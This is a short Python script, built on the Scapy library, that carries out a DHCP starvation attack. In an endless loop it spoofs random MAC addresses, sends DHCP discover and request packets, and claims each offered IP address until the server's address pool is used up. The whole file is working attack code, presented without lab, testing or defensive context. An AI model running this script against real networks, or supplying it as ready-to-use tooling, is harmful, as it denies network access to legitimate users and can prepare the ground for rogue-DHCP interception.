from scapy.all import *
import binascii

from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether


def random_mac() -> str:
    base_16  = list(range(10)) + ['A', 'B', 'C', 'D', 'E', 'F']
    mac = str(random.choice(base_16)) + str(random.choice(base_16))
    for i in range(5):
        mac += str(":" + str(random.choice(base_16)) + str(random.choice(base_16)))
    return mac

conf.checkIPaddr = False

#mac = get_if_hwaddr(conf.iface)
while True:
    mac = random_mac()
    xid_random = random.randint(1, 900000000)

    dhcp_discover = (
        Ether(dst="ff:ff:ff:ff:ff:ff")/
        IP(src="0.0.0.0", dst="255.255.255.255")/
        UDP(sport=68, dport=67)/
        BOOTP(op=1, chaddr=binascii.unhexlify(mac.replace(":", "")), xid = xid_random, flags=0x8000)/
        DHCP(options=[("message-type", "discover"), "end"])
    )

    #print("sending dhcp discover packet")
    response = srp1(dhcp_discover,iface=conf.iface, timeout=5, verbose=False)
    if response:
        #print("/n got an answer")

        offer_ip = response[BOOTP].yiaddr
        server_ip = response[IP].src

        dhcp_request = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(op=1, chaddr=binascii.unhexlify(mac.replace(":", "")), xid=xid_random, flags=0x8000) /
                DHCP(options=[
                    ("message-type", "request"),
                    ("requested_addr", offer_ip),
                    ("server_id", server_ip),
                    "end"])
        )
        sendp(dhcp_request, iface=conf.iface, verbose=False)
        print("requested ", offer_ip, "IP address")